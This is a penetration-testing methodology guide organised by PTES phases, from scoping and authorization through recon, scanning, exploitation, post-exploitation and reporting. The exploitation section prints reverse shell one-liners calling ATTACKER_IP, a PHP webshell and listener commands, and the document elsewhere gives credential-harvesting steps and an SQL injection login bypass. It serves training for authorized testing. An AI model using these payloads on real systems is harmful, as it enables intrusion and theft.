# Attack Methodology - PTES Framework

> Penetration Testing Execution Standard - Comprehensive methodology for ethical hacking engagements.

---

## Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    PENETRATION TESTING PHASES                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  [1] Pre-engagement    → Scope, rules, authorization                 │
│           ↓                                                           │
│  [2] Intelligence      → OSINT, passive recon                        │
│           ↓                                                           │
│  [3] Threat Modeling   → Attack surface, vectors                     │
│           ↓                                                           │
│  [4] Vulnerability     → Scanning, analysis                          │
│           ↓                                                           │
│  [5] Exploitation      → Initial access, pivoting                    │
│           ↓                                                           │
│  [6] Post-Exploitation → Persistence, data access                    │
│           ↓                                                           │
│  [7] Reporting         → Documentation, recommendations              │
│                                                                       │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Pre-engagement Interactions

### 1.1 Scoping

**Questions to Define Scope**:
```markdown
1. What is in scope?
   - IP ranges / domains
   - Specific applications
   - User accounts for testing
   - Physical locations (if applicable)

2. What is OUT of scope?
   - Production databases
   - Third-party services
   - Specific IP ranges
   - Social engineering (unless approved)

3. Testing windows?
   - Business hours only?
   - After-hours testing allowed?
   - Blackout periods?

4. Notification requirements?
   - Who to contact for issues?
   - Emergency contacts?
   - Escalation procedures?
```

### 1.2 Authorization Documentation

**Required Documents**:
```
□ Rules of Engagement (RoE)
□ Statement of Work (SoW)
□ Non-Disclosure Agreement (NDA)
□ Authorization Letter (Get Out of Jail Free card)
□ Emergency Contact List
□ IP Addresses of Testing Systems
```

**Sample Authorization Template**:
```
PENETRATION TESTING AUTHORIZATION

Date: _______________
Client: _______________
Tester: _______________

SCOPE:
- Target systems: _______________
- Testing type: [ ] Black Box  [ ] Gray Box  [ ] White Box
- Methods allowed: [ ] Network  [ ] Web  [ ] Social Engineering  [ ] Physical

AUTHORIZATION:
I, [Name], hereby authorize [Tester] to perform penetration testing
on the systems listed above from [Start Date] to [End Date].

Signature: _______________
Title: _______________
```

---

## Phase 2: Intelligence Gathering

### 2.1 Passive Reconnaissance

**OSINT Sources**:
```bash
# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:sql | ext:db | ext:log
site:target.com "index of"

# Shodan queries
hostname:target.com
ssl.cert.subject.CN:target.com
org:"Target Company"

# GitHub/GitLab searching
"target.com" password
"target.com" api_key
"target.com" secret

# Certificate Transparency
crt.sh: %.target.com
```

**Tools for Passive Recon**:
```bash
# Subdomain enumeration
amass enum -passive -d target.com
subfinder -d target.com -silent

# WHOIS and DNS
whois target.com
dig target.com any
host -t ns target.com

# Wayback Machine
waybackurls target.com | sort -u

# Technology detection
whatweb https://target.com
wappalyzer-cli https://target.com
```

### 2.2 Active Reconnaissance

**Network Discovery**:
```bash
# Host discovery
nmap -sn 192.168.1.0/24
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Port scanning
nmap -sV -sC -p- target.com -oA scan_results
rustscan -a target.com -- -A

# Service enumeration
nmap -sV --script=banner target.com
nc -nv target.com 80
```

**Web Application Fingerprinting**:
```bash
# Technology stack
curl -I https://target.com
nikto -h https://target.com
whatweb -a 3 https://target.com

# Directory discovery
gobuster dir -u https://target.com -w /path/to/wordlist.txt
feroxbuster -u https://target.com -w common.txt

# API endpoint discovery
ffuf -u https://target.com/FUZZ -w api-wordlist.txt
```

---

## Phase 3: Threat Modeling

### 3.1 Attack Surface Mapping

**Entry Points Checklist**:
```
□ Web applications (ports 80, 443, 8080, etc.)
□ API endpoints (REST, GraphQL, SOAP)
□ Authentication mechanisms
□ File upload functionality
□ Search functionality
□ User input fields
□ Admin panels
□ Third-party integrations
□ Mobile app APIs
□ WebSocket connections
```

**Data Flow Diagram (DFD)**:
```
┌──────────┐     HTTPS      ┌───────────┐     SQL      ┌──────────┐
│  User    │───────────────→│  Web App  │─────────────→│ Database │
│ Browser  │←───────────────│  Server   │←─────────────│  Server  │
└──────────┘                └───────────┘              └──────────┘
                                  │
                                  │ API calls
                                  ↓
                            ┌───────────┐
                            │  Third    │
                            │  Party    │
                            │  Service  │
                            └───────────┘

Trust Boundaries:
═══════════════════════════════════════════════════════════════
           Internet  │  DMZ  │  Internal Network  │  Database
═══════════════════════════════════════════════════════════════
```

### 3.2 STRIDE Analysis

| Threat | Description | Example Attack |
|--------|-------------|----------------|
| **S**poofing | Impersonating user/system | Session hijacking, credential theft |
| **T**ampering | Modifying data | SQL injection, parameter manipulation |
| **R**epudiation | Denying actions | Log tampering, missing audit trails |
| **I**nfo Disclosure | Exposing data | Directory traversal, error messages |
| **D**enial of Service | Disrupting availability | Resource exhaustion, crash bugs |
| **E**levation | Gaining higher privileges | Privilege escalation, IDOR |

---

## Phase 4: Vulnerability Analysis

### 4.1 Automated Scanning

**Web Application Scanners**:
```bash
# Burp Suite Professional
# Configure proxy, spider target, run active scan

# OWASP ZAP
zap-cli quick-scan --self-contained https://target.com

# Nuclei
nuclei -u https://target.com -t nuclei-templates/

# SQLMap for SQL injection
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3
```

**Network Vulnerability Scanners**:
```bash
# Nessus
# Professional scanner - web interface

# OpenVAS
gvm-start
greenbone-security-assistant

# Nmap scripts
nmap --script vuln target.com
nmap --script "*-vuln-*" target.com
```

### 4.2 Manual Testing Checklist

**OWASP Top 10 Testing**:
```
□ A01: Broken Access Control
  - IDOR testing
  - Horizontal/vertical privilege escalation
  - Missing function level access control

□ A02: Cryptographic Failures
  - Weak SSL/TLS configuration
  - Sensitive data in URLs
  - Weak password hashing

□ A03: Injection
  - SQL injection (all parameters)
  - Command injection
  - LDAP injection
  - XPath injection

□ A04: Insecure Design
  - Business logic flaws
  - Missing rate limiting
  - Insecure password recovery

□ A05: Security Misconfiguration
  - Default credentials
  - Unnecessary features enabled
  - Missing security headers

□ A06: Vulnerable Components
  - Known CVEs in dependencies
  - Outdated frameworks
  - Unpatched servers

□ A07: Authentication Failures
  - Credential stuffing
  - Brute force attacks
  - Session management flaws

□ A08: Data Integrity Failures
  - Insecure deserialization
  - CI/CD pipeline attacks
  - Software supply chain

□ A09: Logging & Monitoring Failures
  - Missing audit logs
  - No alerting
  - Log injection

□ A10: SSRF
  - Internal port scanning via SSRF
  - Cloud metadata access
  - Internal service access
```

---

## Phase 5: Exploitation

### 5.1 Exploitation Workflow

```
┌─────────────────────────────────────────────────────────────────────┐
│                     EXPLOITATION WORKFLOW                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  Vulnerability Confirmed                                              │
│         ↓                                                             │
│  Research Exploit                                                     │
│    - Public exploits (Exploit-DB, GitHub)                            │
│    - Metasploit modules                                               │
│    - Custom exploit development                                       │
│         ↓                                                             │
│  Setup Environment                                                    │
│    - Listener for reverse shells                                      │
│    - Payload staging server                                           │
│    - Test in lab first                                                │
│         ↓                                                             │
│  Execute Exploit                                                      │
│    - Document all steps                                               │
│    - Screenshot evidence                                              │
│    - Note timestamps                                                  │
│         ↓                                                             │
│  Verify Access                                                        │
│    - Confirm code execution                                           │
│    - Check user context                                               │
│    - Assess impact                                                    │
│                                                                       │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.2 Common Exploitation Techniques

**Initial Access Methods**:
```markdown
1. Web Application Exploits
   - SQL injection → Database access → Code execution
   - File upload → Webshell → RCE
   - SSRF → Internal access → Pivot

2. Network Service Exploits
   - Metasploit modules for known CVEs
   - Custom exploits for 0-days
   - Protocol-specific attacks (SMB, RDP, SSH)

3. Client-Side Attacks
   - Phishing with malicious attachments
   - Browser exploits
   - Malicious documents (macros)

4. Password Attacks
   - Credential stuffing
   - Password spraying
   - Brute force
```

**Payload Examples**:
```bash
# Reverse shell payloads
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP webshell
<?php system($_GET['cmd']); ?>

# Listener setup
nc -lvnp PORT
rlwrap nc -lvnp PORT  # with readline support
```

---

## Phase 6: Post-Exploitation

### 6.1 Objectives

```markdown
1. Maintain Access
   - Establish persistence
   - Create backdoors
   - Multiple access points

2. Internal Recon
   - Network mapping
   - User enumeration
   - Service discovery

3. Privilege Escalation
   - Local exploits
   - Misconfigurations
   - Credential harvesting

4. Lateral Movement
   - Pivot to other systems
   - Access sensitive data
   - Expand foothold

5. Data Collection
   - Identify sensitive data
   - Demonstrate impact
   - Avoid actual exfiltration in most engagements
```

### 6.2 Post-Exploitation Checklist

```
□ Situational Awareness
  - whoami, id, hostname
  - Network configuration
  - Running processes
  - Installed software

□ Credential Harvesting
  - Memory dumps (mimikatz)
  - Configuration files
  - Browser saved passwords
  - SSH keys

□ Persistence Mechanisms
  - Cron jobs / scheduled tasks
  - Startup scripts
  - Service installation
  - Registry modifications (Windows)

□ Internal Reconnaissance
  - Active Directory enumeration
  - Network shares
  - Internal web applications
  - Database access

□ Evidence Collection
  - Screenshots
  - Data samples (sanitized)
  - Access proof
  - Timeline of access
```

---

## Phase 7: Reporting

### 7.1 Report Structure

```markdown
# Penetration Test Report

## Executive Summary
- Overall risk rating
- Key findings (non-technical)
- Business impact
- Recommendations summary

## Methodology
- Scope and objectives
- Testing approach
- Tools used
- Timeline

## Findings
### Critical Findings
### High Findings
### Medium Findings
### Low/Informational

Each finding includes:
- Title
- Risk rating (CVSS)
- Description
- Evidence (screenshots, payloads)
- Impact
- Remediation
- References

## Recommendations
- Prioritized action items
- Quick wins
- Strategic improvements

## Appendices
- Raw scanner output
- Detailed technical notes
- Tool output
```

### 7.2 Finding Template

```markdown
## Finding: [CRITICAL] SQL Injection in Login Form

**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-89 (SQL Injection)
**Location**: https://target.com/login.php

### Description
The login form is vulnerable to SQL injection through the username
parameter. An attacker can bypass authentication or extract database
contents.

### Evidence
**Request**:
```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

**Response**: Successfully logged in as admin without valid password.

### Impact
- Complete authentication bypass
- Access to all user accounts
- Potential database compromise
- Sensitive data exposure

### Remediation
1. Use parameterized queries/prepared statements
2. Implement input validation
3. Apply principle of least privilege to database accounts
4. Deploy WAF rules for SQL injection

### References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
```

---

## Quick Reference

### Risk Rating Matrix

| Likelihood | Low Impact | Medium Impact | High Impact | Critical Impact |
|------------|------------|---------------|-------------|-----------------|
| High       | Medium     | High          | Critical    | Critical        |
| Medium     | Low        | Medium        | High        | Critical        |
| Low        | Info       | Low           | Medium      | High            |

### CVSS Severity

| Score | Rating |
|-------|--------|
| 0.0 | None |
| 0.1 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

### Common Tools by Phase

| Phase | Tools |
|-------|-------|
| Recon | Amass, Subfinder, Shodan, theHarvester |
| Scanning | Nmap, Masscan, Nuclei, Burp Suite |
| Exploitation | Metasploit, SQLMap, Custom scripts |
| Post-Exploit | Mimikatz, BloodHound, Covenant |
| Reporting | Dradis, PlexTrac, Custom templates |
